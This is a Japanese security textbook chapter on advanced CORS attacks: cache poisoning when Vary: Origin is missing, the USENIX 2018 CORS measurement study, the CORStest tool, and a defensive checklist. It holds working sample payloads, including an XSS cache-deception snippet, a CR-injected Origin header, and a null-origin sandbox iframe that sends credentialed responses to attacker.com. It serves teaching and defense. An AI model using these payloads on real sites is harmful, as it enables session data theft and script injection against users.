# 第7章 CORS攻撃の発展

## キャッシュ悪用・クロスドメイン研究・分類ツール

第7章では、CORS（Cross-Origin Resource Sharing、あるオリジンのスクリプトが別オリジンのリソースを読み書きすることをサーバ側の許可のもとで可能にする仕組み）の「発展的な」攻撃面を扱う。基本的な `Access-Control-Allow-Origin`（以下 ACAO）の反射（reflection）だけを知っていても、実務では取りこぼす論点が多い。本節では、(1) HTTP キャッシュとの相互作用による**キャッシュ悪用（cache poisoning / cache deception）**、(2) 実測に基づく学術研究が明らかにした「CORS はなぜ間違えやすいのか」という**根本原因と統計**、(3) 誤設定を体系的に**分類・検出するツール**の3つを、原典に沿って掘り下げる。

読者はすでに、CORS が「サーバが返す ACAO と `Access-Control-Allow-Credentials`（以下 ACAC）というレスポンスヘッダによって、ブラウザに同一オリジンポリシー（SOP）を緩めさせる仕組み」であること、`ACAO: *` と `ACAC: true` は共存できないこと、単純リクエスト（simple request）とプリフライト（preflight、`OPTIONS` による事前確認）の区別を理解している前提とする。

> ⚠️ **スコープ注意**: 本節は防御・診断目的の解説である。ここに載るペイロードや設定例は、自分が管理する検証環境か、明示的な許可のあるバグバウンティ対象でのみ用いること。実在サービスや本番系への無許可の検証・破壊的操作は行わない。

---

### 1. HTTP キャッシュと CORS の相互作用 ―― `Vary: Origin` 欠落の罠

#### なぜキャッシュと CORS が衝突するのか（原理）

CORS ポリシーは「リクエスト元オリジンごとに異なるレスポンスヘッダ（ACAO の値）を返す」という設計になっている。たとえば `a.com` から来れば `ACAO: https://a.com`、`b.com` から来れば `ACAO: https://b.com` を返す、というオリジン依存の応答だ。

ところが、HTTP キャッシュ（ブラウザキャッシュ、CDN、リバースプロキシ、Web プロキシ）の多くは、**URL をキャッシュキーとして**コンテンツを保存する。リクエストヘッダ `Origin` の値まではキーに含めない。つまりキャッシュから見ると「同じ URL なら同じレスポンス」であり、オリジンごとに応答が変わるという CORS の前提を知らない。

この食い違いが問題を生む。仕組みを段階で追う。

1. `a.com` のスクリプトがあるリソース `https://api.example.com/data` にアクセスする。
2. サーバは `Access-Control-Allow-Origin: https://a.com` を付けて応答する。
3. 途中のキャッシュ（あるいは `b.com` と共有される共有キャッシュ）が、この応答を **URL だけをキーに**保存する。
4. その後 `b.com` が同じ URL にアクセスすると、キャッシュは保存済みの応答（`ACAO: https://a.com` 入り）を返してしまう。`b.com` から見ればポリシーが合わないためアクセスできない ―― これは可用性の問題。
5. 逆に、**攻撃者のオリジン向けに反射された寛容な応答がキャッシュに乗ると**、後続の被害者にもそのポリシーが配られ、意図しないオリジンへの読み取りを許してしまう ―― これがセキュリティ問題。

#### 解決策としての `Vary: Origin`

HTTP はこの状況のために `Vary` レスポンスヘッダを用意している。`Vary: Origin` を返すと、キャッシュに対して「このレスポンスは `Origin` リクエストヘッダの値ごとに別のエントリとして保存せよ」と指示できる。これによりオリジンごとにキャッシュが分離され、上記の混線が起きなくなる。

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

**なぜこれで直るのか**: `Vary` はキャッシュキーを「URL + 指定ヘッダの値」に拡張するための標準的な仕組みである。`Vary: Origin` があれば、`Origin: https://a.com` の応答と `Origin: https://b.com` の応答は別々のキャッシュエントリに格納され、片方が他方に配られることがなくなる。

USENIX Security 2018 の大規模実測（後述）では、**132,987 ドメイン（約27%）が複数の異なるオリジンを許可しているのに `Vary: Origin` を設定していなかった**。`azure.microsoft.com` すら該当していたと報告されている。オリジン依存の CORS を返すなら `Vary: Origin` は事実上必須である、というのが本研究の重要な結論のひとつだ。

#### クライアントサイド・キャッシュ悪用（cache deception 型）

HackTricks が示すのは、「レスポンスに反射される任意のリクエストヘッダ」と「`Vary: Origin` 欠落」を組み合わせた、より攻撃的なシナリオである。

前提となる脆弱性は2つ。(a) アプリがあるカスタムリクエストヘッダの値を、エスケープせずレスポンス本文に反射する（結果として反射型 XSS の芽になる）。(b) その応答に `Vary: Origin` が無く、ブラウザキャッシュに乗りうる。

通常、CORS リクエストのレスポンスはブラウザによって直接レンダリングされない（`fetch`/XHR で読むだけ）。だから「ヘッダ反射で XSS ペイロードを入れても、その場では実行されない」と思われがちだ。ここが攻撃者の着眼点になる。

```javascript
function gotcha() {
  location = url            // ③ 同じ URL へ通常ナビゲーションする
}
var req = new XMLHttpRequest()
url = "https://example.com/"
req.onload = gotcha
req.open("get", url, true)
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")  // ① 反射されるヘッダに XSS を注入
req.send()                  // ② 悪意ある応答がキャッシュに保存される
```

**なぜ成立するのか（段階）**:

1. 攻撃者ページ（例: JSFiddle のような外部実行環境）から、XSS ペイロードを載せたカスタムヘッダ付きで対象 URL に XHR を送る。サーバはそのヘッダを本文に反射した応答を返す。
2. `Vary: Origin` が無いため、この「XSS ペイロード入りの応答」がブラウザのキャッシュに **URL をキーとして**保存される。XHR の応答なのでこの時点では実行されない。
3. 直後に `location = url` で**同じ URL へ通常のトップレベルナビゲーション**を行う。ブラウザはネットワークへ行かずキャッシュを引き、汚染済み応答を **HTML ドキュメントとして直接レンダリング**する。ここで `<svg/onload=...>` が発火する。

要点は、「CORS 経由の書き込み（キャッシュ汚染）」と「通常ナビゲーションでの読み出し（レンダリング）」を分離することで、本来レンダリングされないはずの CORS 応答を実行に持ち込んでいる点だ。クライアントサイドのキャッシュを使うため再現性も高い、と HackTricks は述べる。

#### サーバサイド・キャッシュ悪用（HTTP ヘッダインジェクション型）

もうひとつは、`Origin` ヘッダ自体にインジェクションの余地がある場合だ。一部の古いブラウザ（IE/Edge 系）は `0x0d`（CR）をヘッダの区切りとして解釈した。これを突くと `Origin` を経由してサーバ応答に別ヘッダやボディを混入させ、共有キャッシュに保存させて**ストアド XSS**化できる。

```http
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

**なぜ危険か**: `Origin` の値がそのままログや応答生成に組み込まれ、かつ CR をヘッダ境界として扱う実装が下流にあると、レスポンス分割（HTTP response splitting）に発展する。汚染された応答が共有キャッシュに載れば、以後その URL を踏む全員に配られる。これはブラウザ実装依存・年代依存の話であり、現行の主要ブラウザでは CR の扱いが厳格化されているため成立条件は限定的である点に注意（対象環境のバージョンを必ず確認すること）。

> 出典: CORS - Misconfigurations & Bypass — HackTricks — https://book.hacktricks.xyz/pentesting-web/cors-bypass （リダイレクト先の同一内容: https://hacktricks.wiki/en/pentesting-web/cors-bypass.html ／原本 Markdown: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/cors-bypass.md）

#### 補足: `null` オリジンと sandbox iframe（キャッシュ悪用と併用されやすい）

キャッシュ悪用の文脈でしばしば併用されるのが `null` オリジンの偽造だ。`ACAO: null` を許可しているサイトは、`data:` URI やサンドボックス iframe から送られる `Origin: null` を信頼してしまう。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;   // 認証付きで読む
  req.send();
  function reqListener() {
    location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

**なぜ `null` になるのか**: `data:` スキームやサンドボックス化された iframe の内部コンテキストは「不透明なオリジン（opaque origin）」を持ち、その `Origin` は文字列 `null` としてシリアライズされる。攻撃者は任意のサイトからこの `null` を送れるため、`ACAO: null` は「誰でも許可」に等しい。開発者は「リダイレクトやローカルファイルで `null` が来るから」と善意で許可しがちだが、これは攻撃者にも同じ扉を開けてしまう。

---

### 2. 学術的決定版 ―― CORS の実証研究（USENIX Security 2018）

CORS 誤設定を「勘」ではなく「データ」で語れるようにしたのが、Jianjun Chen, Jian Jiang, Hai-Xin Duan, Tao Wan, Shuo Chen, Vern Paxson, Min Yang による論文 *"We Still Don't Have Secure Cross-Domain Requests: an Empirical Study of CORS"*（USENIX Security 2018, pp.1079–1093）である。CORS 実証研究の決定版として現在も参照され続けている。

#### 研究の全体像と規模

著者らは、5大ブラウザ（Chrome, Edge, Firefox, IE, Safari）と11種の主要 OSS Web フレームワークの CORS 実装を解析し、さらに **Alexa 上位 50,000 サイト（およびその 97,199,966 個の異なるサブドメイン）**を大規模計測した。

結論の数字が強烈だ。**132,476 サブドメインに危険な CORS 誤設定**を発見し、これは CORS を設定済みのサブドメイン全体の **27.5%**、CORS 設定済みベースドメイン（public suffix + 1、例: `example.co.uk`）全体の **13.2%** に相当した。該当先には `sohu.com`、`mail.ru`、`sogou.com`、`fedex.com`、`washingtonpost.com` のような著名サイトも含まれていた。

#### 問題を3カテゴリに整理する（論文 Table 1）

論文は CORS の問題を、単なる「設定ミス」に留めず、プロトコル設計に根ざす3つの系統に分類した。ここが本論文の骨格である。

**(A) 過度に寛容な送信権限（Overly permissive sending permission）**

SOP は本来クロスオリジンの「書き込み（送信）」を write-only 的に許していたが、CORS は単純リクエストの過程でこれをさらに緩めた。具体的には CORS は JavaScript が **9個のホワイトリストヘッダ**（`Accept`, `Accept-Language`, `Content-Language`, `Content-Type` ほか）を改変することを許すが、`Content-Type` 以外の値にほとんど制限をかけていなかった。

- **値の制限の甘さ → イントラネット RCE**: 攻撃者は被害者のブラウザを「踏み台」として、内部ネットワークの脆弱サービスへ悪意あるヘッダを送り込める。論文では s2-045（CVE-2017-5638、`Content-Type` 解析の不備による Apache Struts の RCE）を内部網に立てた検証環境で、CORS 単純リクエストの `Content-Type` に攻撃ペイロードを仕込み、イントラネットの被害者がページを開いた瞬間に**内部サーバのシェルを取得**できることを実証した（すべて著者ら自身の環境内での検証）。
    - **なぜ通るのか**: ブラウザは `Content-Type` をCORS標準の3値（`text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`）に制限するが、実装はいずれも**最初のカンマ/セミコロンまでを前方一致（prefix-match）**で検査し、残りを無視した。よって `text/plain;{攻撃ペイロード}` のように正当値の後ろにペイロードを付ければ検査を通過する。また Safari 以外は他のヘッダ値をほぼ無制限に許し、Shellshock ペイロード `(){:;};` すら値に設定できた。
- **ヘッダサイズ制限の甘さ → Cookie 有無のサイドチャネル推定**: 5大ブラウザはいずれも単一/全体で **16MB 超**のヘッダを許した（1GB では「メモリ不足」エラーになる程度で、「ヘッダが大きすぎる」拒否はしない）。一方サーバ側は Apache 8KB、Nginx 8KB、IIS 16KB、Tomcat 8KB、Squid 64KB 程度に制限する。この差を突き、攻撃者はサーバのヘッダ上限ぎりぎりのリクエストを被害者ブラウザから送らせ、**Cookie が付けば上限超過で 400 Bad Request、付かなければ 200 OK** という差から、任意サイトでの被害者の Cookie 有無を遠隔推定できた。
- そのほか「柔軟すぎるボディ形式 → ファイルアップロード CSRF」「ボディ値制限の甘さ → バイナリプロトコルサービスへの攻撃」も挙げられている。

**(B) 危険な信頼依存（Risky trust dependency）**

CORS はリソースサーバに「第三者ドメインを信頼して共有する」ことを求めるが、これは攻撃面を第三者側に拡大する。

- **HTTPS ドメインが自分の HTTP ドメインを信頼 → HTTPS への MITM**: HTTPS サイトが `ACAO` で自分の HTTP 版を信頼していると、中間者攻撃者が HTTP 側を掌握して HTTPS リソースを盗める。計測では **61,347 サブドメイン（12.7%）** がこの誤りを持ち、`fedex.com`, `global.alipay.com`, `www.yandex.ru` が例に挙がる。
    - **根本原因**: 標準がこのリスクを明示しない／`django-cors-headers` はドメインだけ見てプロトコル種別を検査しない／WordPress は互換性のため信頼リストに HTTP と HTTPS を**ハードコード**で両方許していた。
- **全サブドメインを信頼 → 弱いサブドメインの XSS 経由で侵害**: **84,327 サブドメイン（17.5%）** が自分の任意のサブドメインを信頼。`mail.ru`, `mobile.facebook.com`, `payment.baidu.com` が例。どこか1つのサブドメインに XSS があれば親ドメインの認証付きリソースを読める。

**(C) ポリシーの複雑さと誤設定（Policy complexity）**

CORS の表現力の乏しさが、開発者にアプリ層での動的ポリシー生成を強い、そこでミスが多発する。論文は根本原因を4つに整理する。①アクセス制御ポリシーの表現力不足、②`null` オリジンが特定状況で偽造可能、③開発者の理解不足、④キャッシュとの相互作用（前節の `Vary` 問題）。

計測では **CORS 設定済みドメインの 10.4% が攻撃者制御可能なサイトを信頼**しており、**11フレームワーク中8つが安全でないポリシーを生成しうる**ことが判明した。

#### 誤設定の分類と実測値（論文 Table 3）

検証（validation）の失敗は、`Origin` を検査しようとして間違えるパターンとして4類型に整理される。全体で **50,216 ドメイン（10.4%）** がこの検証ミスを持っていた。

| 分類 | サブドメイン数（割合） | 例と原理 |
|---|---|---|
| Reflecting origin（無検証反射） | 15,902（3.3%） | `Origin` をそのまま `ACAO` に反射。`account.sogou.com`, `analytics.microsoft.com`。任意サイト信頼に等しい |
| Prefix match（前方一致） | 1,876（0.4%） | 末尾チェック漏れで `example.com.attacker.com` を許可。`tv.sohu.com`, `myaccount.realtor.com` |
| Suffix match（後方一致） | 32,575（6.8%） | `example.com` で終わればよいとし `attackexample.com` を許可。`m.hulu.com`, `www.php.net` |
| Substring match（部分一致） | 430（0.1%） | 部分文字列一致で `ashingtonpost.co` を許可（登録可能）。`subscribe.washingtonpost.com` |
| Not escaping "."（ドット未エスケープ） | 890（0.2%） | 正規表現で `.` を未エスケープし `wwwaexample.com` を許可。`www.nlm.nih.gov` |
| Trust null（null 信頼） | 3,991（0.8%） | `ACAO: null`+`ACAC: true`。任意サイトから偽 `null` で読取。`mingxing.qq.com`, `aboutyou.de` |
| HTTPS trust HTTP | 61,347（12.7%） | 上記(B)参照 |
| Trust all subdomains | 84,327（17.5%） | 上記(B)参照 |
| **合計** | **132,476（27.5%）** | ベースドメイン 2,913（13.2%） |

**各類型が生まれる仕組み**（教科書の核心）:
- **前方一致**は「`Origin` が `example.com` で始まるか」を見て末尾の確認を怠るコードから生じる。`https://example.com.attacker.com` は先頭が一致するので通る。
- **後方一致**は「`example.com` で終わるサブドメインを全部許したい」という善意の実装が、`.`（サブドメイン区切り）を要求せず単なる文字列の末尾一致にすると、攻撃者が登録できる `attackexample.com`（区切りなしで連結）まで通してしまう。
- **ドット未エスケープ**は正規表現特有。`www.example.com` を許すつもりの `/www.example\.com/` ならぬ `/www.example.com/` では、`.` が「任意の1文字」にマッチし `wwwaexample.com` を許す。
- **部分一致**は `indexOf`/`contains` 的な緩い検査で、信頼文字列を含みさえすれば通るため最も危険度が読みにくい。

#### `null` オリジンの偽造（論文 6.x）

論文は `null` の定義が標準で曖昧である点を指摘する。ブラウザは複数の状況（`data:` URI、サンドボックス iframe、リダイレクト後、ローカルファイルなど）で `Origin: null` を送るため、`ACAO: null`+`ACAC: true` を設定したサイトは、攻撃者が前掲の sandbox iframe から偽造した `null` でも認証付きで読めてしまう。該当は 3,991 ドメイン（約0.8%）。

#### 標準・ブラウザへの反映（論文の提言と Disclosure）

著者らは以下を提言し、その一部が WHATWG Fetch 標準や主要ブラウザに実際に採用された点が重要だ（＝この論文は現在の CORS 挙動を形作った）。

- **常時プリフライト（always-preflight）**を著者らは推奨したが、既存サイトを壊す懸念から不採用。代わりに WHATWG は **CORS ホワイトリストヘッダに危険文字（例: `{`）を禁止**し、**ヘッダサイズを制限**し、**AFP ポートへのアクセスを制限**する方向で対応した。これらは Fetch 標準に反映済み／マージ待ちとされた。
- **CORS 設定の簡素化**: 表現力不足を補うため、オリジンリストやサブドメインワイルドカードのような高度なポリシーをブラウザが直接サポートすべきだと提言。
- **`null` の明確化**、および**標準本文でのリスク明示**（信頼依存の危険や誤りやすい細部をベストプラクティスとして明文化）。
- なお、「HTTPS が HTTP を信頼」「偽造可能な `null`」といった設定側の誤りは、標準変更ではなくサイト側の修正で対処すべきとされた。

**時事性の注意**: 本論文は2018年時点の計測・実装挙動に基づく。上記の対策（危険文字禁止・ヘッダサイズ制限等）はその後 Fetch 標準・各ブラウザに順次取り込まれたため、当時成立した攻撃の一部（特に(A)の一部）は現行ブラウザでは緩和されている。一方、(B)(C)の**設定側の誤り**は今日も日常的に発見される。診断時は対象環境のブラウザ／フレームワークのバージョンと修正状況を必ず確認すること。

> 出典: Jianjun Chen et al., "We Still Don't Have Secure Cross-Domain Requests: an Empirical Study of CORS", USENIX Security 2018 — https://www.usenix.org/conference/usenixsecurity18/presentation/chen-jianjun （本文 PDF: https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-chen.pdf）

---

### 3. 誤設定を分類・検出するツール ―― CORStest

理論を検出に落とし込むのが **CORStest**（RUB-NDS、Python 3 製）である。URL リストに対しさまざまな `Origin` を送り、返ってくる `ACAO`／`ACAC` の挙動から誤設定を**カテゴリ分類**する。学習用として、各カテゴリ名がそのまま「何が危ないか」の語彙になる点が優れている。

#### CORStest が判定するカテゴリと原理

- **Developer backdoor（開発者バックドア）**: `JSFiddle`, `CodePen` など**開発・実験用の外部プラットフォームが許可**されている状態。開発中の便宜で信頼リストに入れたまま本番に残るパターン。誰でもその環境からコードを書けるため、実質的に任意オリジン許可に近い裏口になる。
- **Origin reflection（オリジン反射）**: サーバがリクエストの `Origin` をそのまま `ACAO` に反射。**任意のサイトがリソースにアクセス可能**。論文の "Reflecting origin" に対応。
- **Null misconfiguration（null 誤設定）**: `ACAO: null` を許可。攻撃者は**サンドボックス iframe で `Origin: null` を強制**して制限を回避できる。前節の sandbox iframe 手法が刺さる。
- **Pre-domain wildcard（ドメイン前方ワイルドカード）**: `notdomain.com` のように**信頼ドメインの前に文字を付けた形**（例: `evildomain.com`）が通る。攻撃者は類似ドメインを登録してアクセスを得る。論文の prefix/substring 系に対応。
- **Post-domain wildcard（ドメイン後方ワイルドカード）**: `domain.com.evil.com` のように**信頼ドメインの後ろに攻撃者ドメインを連ねた形**が通る。攻撃者が制御するサブドメイン/ドメインを登録して悪用。論文の suffix 系に対応。
- **Subdomains allowed（サブドメイン許可）**: **任意のサブドメインを許可**。どこかのサブドメインに XSS があれば悪用可能。論文の "Trust all subdomains"（17.5%）に対応。
- **Non-SSL sites allowed（非SSL許可）**: **HTTP オリジンが HTTPS リソースへアクセス可能**。中間者攻撃で暗号化を破れる。論文の "HTTPS trust HTTP"（12.7%）に対応。
- **Invalid CORS header（不正な CORS ヘッダ）**: ワイルドカードの不適切な使用や複数オリジン宣言など。**それ自体は直接悪用できない**が、設定が壊れている兆候。

#### 悪用可能性の判定における `ACAC` の役割

CORStest のドキュメントが強調する重要点は、上記の多く（オリジン反射・null・各ワイルドカード）は、**`Access-Control-Allow-Credentials: true` が併存して初めて本格的に悪用できる**ということだ。

**なぜか**: `ACAC: true` が無ければ、クロスオリジンの `fetch`/XHR は Cookie などの資格情報を**送らない**。つまり応答は「認証なしで誰でも取れる公開情報」に限られ、盗む価値のある**認証済みリソース**は返ってこない。`ACAC: true` があって初めて、被害者のセッションで認証済みデータを読み出せる。診断では「反射している」だけでなく「`ACAC: true` か」「機微データが認証付きで返るか」までを必ずセットで確認する ―― これが誤検知（false positive）を避ける実務上の勘所である。

#### 実測の位置づけ

CORStest は Alexa 上位100万サイトを対象にした検査で、**CORS を有効化していたのは約3%**にとどまり、絶対数としての脆弱サイトは比較的少なかったと報告する。前掲 USENIX 研究（CORS 設定済みのうち27.5%が誤設定）と合わせて読むと、「CORS を使うサイトは限られるが、使っているサイトの相当割合が間違えている」という構図が見えてくる。

> 出典: CORStest (RUB-NDS) — https://github.com/RUB-NDS/CORStest

---

### 4. まとめと防御チェックリスト

本節の3資料は、CORS 発展攻撃を「相互作用（キャッシュ）」「実証（統計と根本原因）」「分類（検出語彙）」の3面から補完し合う。防御・診断の要点を凝縮する。

- **`Vary: Origin` を必ず返す**。オリジン依存の CORS を返すのに `Vary` を欠くと、キャッシュ混線・キャッシュ悪用・（反射ヘッダと組めば）XSS へ発展する。USENIX 実測で約27%が欠落していた最頻の落とし穴。
- **`Origin` の検証は「厳格な許可リストの完全一致」で行う**。前方一致・後方一致・部分一致・正規表現のドット未エスケープは、いずれも攻撃者登録可能なドメインを通す。動的生成が必要でも、比較は正規化した完全一致にする。
- **`ACAO: null` を許可しない**。`null` は `data:`/sandbox iframe から誰でも偽造できる。
- **`ACAC: true` と反射・ワイルドカードを組み合わせない**。資格情報を返すなら許可オリジンは静的な完全一致のみ。
- **HTTP オリジンや任意サブドメインを無条件に信頼しない**。プロトコル種別まで検査し、サブドメインは列挙した許可リストに限る。
- **開発用オリジン（JSFiddle 等）を本番の信頼リストに残さない**（developer backdoor）。
- **内部サービスは Host ヘッダ検証・TLS・認証を施す**。CORS 単純リクエストがブラウザを踏み台にした内部攻撃の入口になりうる（USENIX のイントラ RCE 実証）。対象環境のブラウザ・フレームワークのバージョンと修正状況を確認する。
- **CORStest / CORScanner 等で機械的に分類検査**しつつ、`ACAC` と機微データの有無まで人手で確認して誤検知を排する。


---

## ナビゲーション

[← 第6章 CORS設定不備のエクスプロイト](06-cors-exploitation.md)　｜　[📚 目次（ホーム）](index.md)　｜　[第8章 CSRF/CORSの連鎖と他脆弱性との組み合わせ →](08-chaining.md)
